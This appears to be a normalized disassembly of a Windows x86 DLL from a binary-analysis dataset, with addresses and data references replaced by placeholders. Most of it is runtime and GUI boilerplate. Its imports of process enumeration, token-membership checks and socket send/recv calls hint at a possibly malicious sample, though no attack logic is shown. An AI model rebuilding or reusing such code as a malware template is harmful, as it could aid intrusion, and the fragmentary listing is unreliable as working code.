call sub_10005a07
add esp 0xc
retn
sub_10005aac
push 0xd
call sub_10006a09
pop ecx
retn
sub_10005ab5
push 0xd
call sub_10006a6a
pop ecx
retn
sub_1000670c
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_10006719
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_10006729
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_1000678b
call sub_1000699d
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_100067a9
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_10006974
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_10007666
call sub_100078e2
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_1000a2e5
sub_100078e2
push 0x1
call sub_100078eb
pop ecx
retn
sub_10007f83
push [ ebp - 0x14 ]
call sub_10007fba
pop ecx
retn
sub_10007fba
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_1000842c
xor eax eax
retn
sub_100080f0
push [ ebp - 0x14 ]
call sub_10008166
pop ecx
retn
sub_10008348
push 0x1
pop eax
retn
sub_1000834c
mov esp [ ebp - 0x18 ]
jmp sub_1000842c
sub_100083aa
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_100083b3
mov esp [ ebp - 0x18 ]
jmp sub_1000842c
sub_10008474
push 0x1
pop eax
retn
sub_100084ca
push 0x1
pop eax
retn
sub_10008fc9
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_100045aa
add esp 0x8
pop ebp
retn 0x4
sub_1000902a
push sub_10008fe4
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_1000903b
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_1000942a
push 0x1
pop eax
retn
sub_100094de
push 0x1
pop eax
retn
sub_100098d9
push esi
push 0xb
call sub_10006a09
push [ esp + 0xc ]
call sub_100098fa
push 0xb
mov esi eax
call sub_10006a6a
add esp 0xc
mov eax esi
pop esi
retn
sub_10009cdf
push 0x1
pop eax
retn
sub_1000a625
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_1000a9a9
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_1000a9c5
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_1000a9e1
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_1000ac63
push 0x2
call sub_100047cc
pop ecx
retn
sub_1000b5e9
push 0x1
pop eax
retn
sub_1000b658
push 0x1
pop eax
retn
sub_1000b940
mov eax [ esp + 0x4 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
and eax 0xff
shr eax 0x4
and eax 0x1
retn
xor eax eax
retn
sub_1000bce0
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x40 ]
test eax eax
jne r-xdata
push eax
call sub_1000c3d0
add esp 0x4
xor eax eax
retn
or eax 0xffffffff
retn
sub_1000bd00
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x40 ]
test eax eax
jne r-xdata
push eax
call sub_1000c470
add esp 0x4
xor eax eax
retn
or eax 0xffffffff
retn
sub_1000be40
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_1000be50
mov [ rw-data ] 0x0
retn
sub_1000c770
mov eax [ ecx + 0x8 ]
retn
sub_1000c780
mov eax [ ecx + 0x8 ]
mov ecx [ esp + 0x4 ]
lea eax [ eax + ecx * 8 + 0x78 ]
retn 0x4
sub_1000c930
call sub_1000c950
test eax eax
je r-xdata
call sub_1000c9e0
neg eax
sbb eax eax
neg eax
retn
mov eax 0x1
retn
sub_1000c996
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
mov eax [ eax + 0x4 ]
mov [ ebp - 0x20 ] eax
mov [ eax + 0xa4 ] 0xffffffff
add [ eax + 0xb8 ] 0x4
or eax 0xffffffff
retn
sub_1000c9b7
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000ca54
mov eax 0x1
retn
sub_1000ca5a
mov esp [ ebp - 0x18 ]
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000cf70
mov eax [ esp + 0x4 ]
push eax
call sub_1000413e
pop ecx
retn
sub_1000fe10
mov ecx [ esp + 0x4 ]
cmp ecx 0x2
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
retn
cmp ecx 0x3
je r-xdata
or eax 0xffffffff
retn
sub_1000fe70
call WSACleanup
mov [ rw-data ] 0x0
xor eax eax
retn
sub_10010250
mov eax [ rw-data ]
mov ecx 0x1
cmp eax ecx
je r-xdata
retn
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
cmp [ eax ] 0x2
jne r-xdata
mov [ eax + 0x1434 ] ecx
RtlUnwind
jmp [ RtlUnwind@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
ClosePrinter
jmp [ ClosePrinter@IAT ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
GetFileTitleA
jmp [ GetFileTitleA@IAT ]
CheckTokenMembership
jmp [ CheckTokenMembership@IAT ]
connect
jmp [ connect@IAT ]
socket
jmp [ socket@IAT ]
htons
jmp [ htons@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
closesocket
jmp [ closesocket@IAT ]
send
jmp [ send@IAT ]
recv
jmp [ recv@IAT ]
sub_10012aaa
mov edx [ esp + 0x4 ]
dec [ edx + 0x4 ]
js r-xdata
push edx
call sub_10011f72
pop ecx
retn
mov ecx [ edx ]
movzx eax [ ecx ]
inc ecx
mov [ edx ] ecx
retn
sub_10012ac4
cmp [ esp + 0x4 ] 0xffffffff
je r-xdata
retn
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_10012d2f
pop ecx
pop ecx
sub_1001311c
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push r--data
push eax
mov [ ebp - 0x4 ] rw-data
call sub_10004998
sub_10013239
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_10013219
sub_10013276
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
add eax 0x4
push eax
call sub_1001462e
pop ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov [ ecx ] eax
retn 0xc
sub_10013296
test ecx ecx
je r-xdata
retn
push esi
mov esi [ ecx ]
push ecx
call sub_10014657
pop ecx
test esi esi
mov ecx esi
jne r-xdata
pop esi
sub_100132d3
push esi
mov esi ecx
call sub_1001335f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_1001335f
mov eax sub_10019c18
call sub_10004904
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_10013334
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_100133d5
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_10013334
sub_10013557
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0xc ] ecx
or [ eax + 0x4 ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_10013571
push esi
mov esi ecx
call sub_100135ac
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_1001358d
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x4 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
retn 0x4
sub_10013863
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
retn
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
push eax
call [ GetLastError@IAT ]
push eax
call sub_100146df
sub_100138c5
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ esi + 0xc ]
call sub_10014458
pop esi
retn
push eax
call [ CloseHandle@IAT ]
or [ esi + 0x4 ] 0xffffffff
sub_10013990
xor eax eax
retn 0x10
sub_10013cb1
call sub_10018d52
inc [ eax + 0x10 ]
retn
sub_10013f75
mov ecx [ ebp - 0x18 ]
call sub_10014678
mov eax r-xdata
retn
sub_10014275
call sub_1001427f
jmp sub_1001428e
sub_1001427f
push 0x40
push 0x50
mov ecx rw-data
call sub_10003bd1
retn
sub_1001428e
push sub_1001429a
call sub_1000487d
pop ecx
retn
sub_1001429a
mov ecx rw-data
jmp sub_10003bf9
sub_100142a4
call sub_100142ae
jmp sub_100142c0
sub_100142ae
push 0x40
push 0x90
mov ecx rw-data
call sub_10003bd1
retn
sub_100142c0
push sub_100142cc
call sub_1000487d
pop ecx
retn
sub_100142cc
mov ecx rw-data
jmp sub_10003bf9
sub_100142d6
call sub_100142e0
jmp sub_100142f2
sub_100142e0
push 0x40
push 0x110
mov ecx rw-data
call sub_10003bd1
retn
sub_100142f2
push sub_100142fe
call sub_1000487d
pop ecx
retn
sub_100142fe
mov ecx rw-data
jmp sub_10003bf9
sub_10014308
call sub_10014312
jmp sub_10014324
sub_10014312
push 0x40
push 0x210
mov ecx rw-data
call sub_10003bd1
retn
sub_10014324
push sub_10014330
call sub_1000487d
pop ecx
retn
sub_10014330
mov ecx rw-data
jmp sub_10003bf9
sub_10014435
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
pop esi
retn 0x4
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx esi
call sub_100143bc
sub_10014458
mov eax [ ecx ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
retn
cmp [ eax - 0xc ] 0x0
jl r-xdata
push rw-data
call sub_10014576
jmp sub_10014404
sub_10014614
call sub_1001311c
xor eax eax
retn
sub_10014657
push [ esp + 0x4 ]
call sub_1000413e
pop ecx
retn
sub_10014662
mov eax ecx
mov [ eax + 0x4 ] 0x1
retn
sub_1001466c
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x4
sub_10014678
cmp [ ecx + 0x4 ] 0x0
jle r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_100146df
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ esp + 0xc ]
call sub_1001480b
push eax
call sub_100147a0
sub_10014a89
mov eax ecx
push 0x1
pop ecx
xor edx edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
retn
sub_10014ce4
push 0x1
pop eax
retn 0x4
sub_10014cea
mov eax 0x80029c4a
retn 0x8
sub_10014cf2
call sub_10018d2c
mov eax [ eax + 0x4 ]
push 0x1
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_10014d07
call sub_10018d2c
mov eax [ eax + 0x4 ]
push 0xffffffff
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_10014d1c
mov eax r--data
retn
sub_10014d22
mov eax r--data
retn
sub_10014d28
mov eax r--data
retn
sub_10014d2e
push 0x1
pop eax
retn
sub_10014d32
xor eax eax
retn 0x4
sub_10014d37
mov eax r--data
retn
sub_10014d3d
mov eax r--data
retn
j_sub_10014f0d
jmp sub_10014f0d
sub_10014f0d
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
retn
sub_10014f1e
call sub_10014f28
jmp sub_10014f35
sub_10014f28
push 0x0
mov ecx rw-data
call sub_10015054
retn
sub_10014f35
push sub_10014f41
call sub_1000487d
pop ecx
retn
sub_10014f41
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_10015a27
sub_10014f5c
call sub_10014f66
jmp sub_10014f73
sub_10014f66
push 0x1
mov ecx rw-data
call sub_10015054
retn
sub_10014f73
push sub_10014f7f
call sub_1000487d
pop ecx
retn
sub_10014f7f
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_10015a27
sub_10014f9a
call sub_10014fa4
jmp sub_10014fb1
sub_10014fa4
push 0xffffffff
mov ecx rw-data
call sub_10015054
retn
sub_10014fb1
push sub_10014fbd
call sub_1000487d
pop ecx
retn
sub_10014fbd
test [ rw-data ] 0x4
jne r-xdata
retn
or [ rw-data ] 0x4
mov ecx rw-data
jmp sub_10015a27
sub_10014fd8
call sub_10014fe2
jmp sub_10014fef
sub_10014fe2
push 0xfffffffe
mov ecx rw-data
call sub_10015054
retn
sub_10014fef
push sub_10014ffb
call sub_1000487d
pop ecx
retn
sub_10014ffb
test [ rw-data ] 0x8
jne r-xdata
retn
or [ rw-data ] 0x8
mov ecx rw-data
jmp sub_10015a27
sub_10015038
push esi
mov esi ecx
call sub_10015a27
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_10015080
push esi
mov esi [ esp + 0x8 ]
push [ esp + 0xc ]
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov ecx esi
call sub_1001744a
mov ecx [ esp + 0x10 ]
pop esi
mov [ ecx ] eax
retn 0xc
sub_100153db
push 0x0
call sub_10015342
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_10013420
sub_10015460
retn
sub_100159bb
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
push 0x1
pop eax
pop esi
retn 0x4
push 0x1
call sub_1001716a
mov [ esi + 0x28 ] r--data
sub_10015bd3
cmp [ ecx + 0x1c ] 0x0
mov eax [ ecx ]
je r-xdata
jmp [ eax + 0xa4 ]
jmp [ eax + 0x58 ]
sub_10015c78
lea eax [ ecx + 0x28 ]
retn
sub_10015c7c
push esi
mov esi ecx
call sub_10018d2c
mov eax [ eax + 0x1034 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x4
push esi
push [ esp + 0xc ]
call eax
sub_10015dca
mov eax [ esp + 0x8 ]
push esi
push 0x0
mov esi ecx
push [ eax + 0xc ]
call sub_100169a3
test eax eax
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_1001531b
sub_100160b9
mov eax r--data
retn
sub_100166b5
push esi
mov esi ecx
call sub_10014d43
mov [ esi ] r--data
mov [ esi + 0x28 ] 0x1
mov eax esi
pop esi
retn
sub_100166ce
mov eax [ esp + 0x4 ]
mov [ ecx + 0x18 ] 0x1
mov [ ecx + 0x28 ] eax
retn 0x4
sub_100166df
retn 0x4
sub_10016bb7
cmp [ esp + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn 0x8
call sub_10018afa
test [ eax + 0xdf ] 0x40
jne r-xdata
push 0x1
call sub_10015c9b
sub_10017087
mov eax [ ecx + 0x24 ]
and eax 0x10
retn
sub_10017421
xor eax eax
retn
sub_10017424
push [ esp + 0x4 ]
mov ecx rw-data
call sub_10003cc4
retn
sub_10017433
push [ esp + 0xc ]
mov ecx [ ecx + 0x34 ]
push [ esp + 0xc ]
mov eax [ ecx ]
push [ esp + 0xc ]
call [ eax + 0x54 ]
retn 0xc
sub_1001744a
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x70 ]
push 0xfffffff0
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_10017464
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x74 ]
push 0xffffffec
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_100174cd
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xa4 ]
push [ ecx + 0x1c ]
call [ IsWindowEnabled@IAT ]
retn
sub_100174e8
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0xa8 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
jmp r-xdata
retn 0x4
sub_1001750f
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xac ]
push [ ecx + 0x1c ]
call [ SetFocus@IAT ]
push eax
call sub_100153b4
retn
sub_100177d3
push 0x1
call sub_10017761
mov ecx eax
push [ esp + 0x4 ]
call sub_10013e19
retn 0x4
sub_100177e8
push 0x0
call sub_10017761
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_10013420
sub_10017830
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_10017806
push eax
call [ DestroyMenu@IAT ]
retn
xor eax eax
retn
sub_1001795d
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn 0x4
push eax
call [ DeleteObject@IAT ]
and [ esi ] 0x0
sub_100179fe
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_10017a12
push esi
mov esi ecx
call sub_10017ae6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014657
pop ecx
sub_10017aa0
push 0x1
call sub_10017a2e
mov ecx eax
push [ esp + 0x4 ]
call sub_10013e19
retn 0x4
sub_10017b1c
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
retn 0x4
sub_10017b26
mov eax [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
retn 0x4
sub_10017b30
and [ ecx + 0x8 ] 0x0
retn
sub_10017b35
and [ ecx + 0x4 ] 0x0
retn
sub_10017e97
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ GetClipBox@IAT ]
retn 0x4
sub_10017f19
push 0x1
call sub_10017ea7
mov ecx eax
push [ esp + 0x4 ]
call sub_10013e19
retn 0x4
sub_10017f58
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_10017f2e
push eax
call [ DeleteObject@IAT ]
retn
xor eax eax
retn
sub_100181b0
call sub_10018afa
mov eax [ eax + 0xc4 ]
retn
sub_100182f5
lea eax [ esp + 0xc ]
push 0x1
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_100181bc
retn 0xc
sub_1001830c
call sub_10018d2c
xor ecx ecx
cmp [ eax + 0x2c ] ecx
sete cl
mov eax ecx
retn
sub_1001831c
mov eax r--data
retn
sub_10018387
push 0x30
call sub_10018440
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_1001839c
push 0x4
call sub_10018440
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_100183b1
push esi
mov esi ecx
call sub_10019315
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1001845e
sub_100183cc
push esi
mov esi ecx
call sub_10019356
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1001845e
sub_100183e7
mov edx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
push esi
mov esi [ ecx ]
mov [ edx + eax ] esi
mov [ ecx ] eax
pop esi
retn 0x4
sub_10018440
push esi
push [ esp + 0x8 ]
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn 0x4
call sub_1001311c
sub_1001845e
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x4
push [ esp + 0x4 ]
call [ LocalFree@IAT ]
sub_10018764
push esi
mov esi ecx
call sub_1001877f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1001845e
sub_1001877f
retn
sub_100189c0
push 0x10
call sub_1001908a
xor edi edi
push edi
push edi
call sub_10004998
sub_100189f5
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
call sub_10018780
sub_10018a0b
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
retn 0x8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_1001885a
sub_10018a25
inc [ rw-data ]
retn
sub_10018a2c
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
dec [ rw-data ]
jne r-xdata
retn
call sub_100184b4
and [ rw-data ] 0x0
sub_10018a54
mov eax ecx
or [ eax + 0xd4 ] 0xffffffff
or [ eax + 0x104 ] 0xffffffff
mov [ eax ] r--data
retn
sub_10018a6b
push esi
mov esi ecx
call sub_10018a86
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1001845e
sub_10018afa
push sub_10018322
mov ecx rw-data
call sub_100188b3
retn
sub_10018b0a
call sub_10018b14
jmp sub_10018b15
sub_10018b14
retn
sub_10018b15
push sub_10018b21
call sub_1000487d
pop ecx
retn
sub_10018b21
mov ecx rw-data
jmp r-xdata
jmp sub_10018957
sub_10018b93
push esi
mov esi ecx
call sub_10018bae
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1001845e
sub_10018c23
mov eax ecx
and [ eax + 0x8 ] 0x0
and [ eax + 0xc ] 0x0
mov [ eax ] r--data
mov [ eax + 0xc ] 0x54
mov [ eax + 0x28 ] sub_10014614
retn
sub_10018c42
push esi
mov esi ecx
call sub_10018c5d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1001845e
sub_10018d0b
call sub_10018d15
jmp sub_10018d16
sub_10018d15
retn
sub_10018d16
push sub_10018d22
call sub_1000487d
pop ecx
retn
sub_10018d22
mov ecx rw-data
jmp j_sub_100189d0
sub_10018d52
call sub_10018d2c
add eax 0x1070
push sub_10018356
mov ecx eax
call sub_100188b3
retn
sub_10018d91
push esi
mov esi ecx
call j_sub_10018bae
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1001845e
j_sub_10018bae
jmp sub_10018bae
sub_1001908a
cmp [ rw-data ] 0x0
jne r-xdata
retn 0x4
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ LeaveCriticalSection@IAT ]
sub_100190ab
mov eax r--data
retn
sub_100190b1
call sub_100190bb
jmp sub_100190cd
sub_100190bb
push 0xf023
push 0x0
mov ecx rw-data
call sub_100038cf
retn
sub_100190cd
push sub_100190d9
call sub_1000487d
pop ecx
retn
sub_100190d9
mov ecx rw-data
jmp sub_10003915
sub_100190e3
mov eax r--data
retn
sub_100190e9
call sub_100190f3
jmp sub_10019105
sub_100190f3
push 0xf021
push 0x0
mov ecx rw-data
call sub_1000391c
retn
sub_10019105
push sub_10019111
call sub_1000487d
pop ecx
retn
sub_10019111
mov ecx rw-data
jmp sub_10003962
sub_1001911b
mov eax r--data
retn
sub_10019233
mov eax r--data
retn
sub_10019279
push esi
mov esi ecx
call j_sub_10015a27
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_10003cc4
j_sub_10015a27
jmp sub_10015a27
sub_1001929e
mov eax r--data
retn
sub_100192a4
call sub_100192ae
jmp sub_100192bd
sub_100192ae
push 0x40
push 0x3c
mov ecx rw-data
call sub_10003bd1
retn
sub_100192bd
push sub_100192c9
call sub_1000487d
pop ecx
retn
sub_100192c9
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_10003bf9
sub_1001938c
call sub_10019396
jmp sub_10019397
sub_10019396
retn
sub_10019397
push r-xdata
call sub_1000487d
pop ecx
retn
sub_100193ad
call sub_100193b7
jmp sub_100193b8
sub_100193b7
retn
sub_100193b8
push sub_100193c4
call sub_1000487d
pop ecx
retn
sub_100193c4
mov ecx rw-data
jmp j_sub_100189d0
sub_100193ce
call sub_100193d8
jmp sub_100193e2
sub_100193d8
mov ecx rw-data
jmp sub_1001944a
sub_100193e2
push sub_100193ee
call sub_1000487d
pop ecx
retn
sub_100193ee
mov ecx rw-data
jmp sub_100198d1
sub_10019428
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
mov [ rw-data ] eax
call esi
and [ rw-data ] 0x0
mov [ rw-data ] eax
pop esi
retn
sub_100194e5
mov eax r--data
retn
sub_100194eb
mov eax ecx
mov [ eax ] r--data
retn
sub_100194f4
push esi
mov esi ecx
call sub_100198db
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1001845e
sub_1001950f
call sub_10019519
jmp sub_1001951a
sub_10019519
retn
sub_1001951a
push sub_10019526
call sub_1000487d
pop ecx
retn
sub_10019526
mov ecx rw-data
jmp j_sub_100189d0
j_sub_100189d0
jmp sub_100189d0
sub_10019558
jmp r-xdata
call sub_10019535
mov [ rw-data ] eax
retn
sub_10019568
push 0x8
call sub_1001462e
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_10019582
mov eax r--data
retn
sub_10019588
mov ecx rw-data
call sub_10003c35
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_100195a4
push esi
mov esi ecx
call sub_100195c4
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_10003cc4
sub_100195c4
mov eax sub_10019c74
call sub_10004904
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_10017830
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_100195ed
mov eax r--data
retn
sub_100195f3
call sub_100195fd
jmp sub_1001960c
sub_100195fd
push 0x40
push 0x8
mov ecx rw-data
call sub_10003bd1
retn
sub_1001960c
push sub_10019618
call sub_1000487d
pop ecx
retn
sub_10019618
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_10003bf9
sub_10019633
mov eax r--data
retn
sub_10019639
call sub_10019643
jmp sub_10019655
sub_10019643
push 0xf022
push 0x0
mov ecx rw-data
call sub_10003d35
retn
sub_10019655
push sub_10019661
call sub_1000487d
pop ecx
retn
sub_10019661
mov ecx rw-data
jmp sub_10003d7b
sub_1001966b
mov eax r--data
retn
sub_10019671
call sub_1001967b
jmp sub_1001968d
sub_1001967b
push 0xf024
push 0x0
mov ecx rw-data
call sub_10003d82
retn
sub_1001968d
push sub_10019699
call sub_1000487d
pop ecx
retn
sub_10019699
mov ecx rw-data
jmp sub_10003dc8
sub_100196a3
push 0x10
call sub_1001462e
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_100179fe
retn
sub_100196ba
mov eax r--data
retn
sub_100196c0
push 0x8
call sub_1001462e
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_100196da
mov eax r--data
retn
sub_10019706
push esi
mov esi ecx
call j_sub_10017ae6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_10003cc4
j_sub_10017ae6
jmp sub_10017ae6
